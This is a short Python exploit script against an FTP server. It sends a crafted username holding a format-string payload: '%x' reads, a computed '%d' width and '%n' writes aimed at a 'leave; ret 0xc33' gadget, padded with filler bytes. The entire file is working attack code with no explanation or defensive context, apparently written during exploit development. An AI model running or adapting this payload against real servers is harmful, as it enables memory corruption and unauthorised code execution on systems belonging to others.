#!/usr/bin/python
from struct import pack
import socket
import time
import sys
from ftplib import FTP


server = sys.argv[1] # IP
port = 21 # PORT


def ftp_login(user, password):
    try:
        ftp = FTP(server, user=user, passwd=password)
        ftp.login()
    except Exception as e:
        print(str(e))


def main():
    user = "%x"*8
    '''
    nasm > leave
    00000000  C9                leave
    nasm > retn 0xc33
    00000000  C2330C            ret 0xc33
    '''
    address = 204718793 - 64 # 0xc9c2330c = leave; ret 0xc33
    user += (("%"+str(address)+"d")) # 9th
    user += "%n" # 10
    user += "%n"
    user += "A" * (51+17+3)
    user += "BBBB"
    user += "C"*(27-3-4)
    user += "D"*300

    ftp_login(user, "password")
    

if __name__ == "__main__":
    main()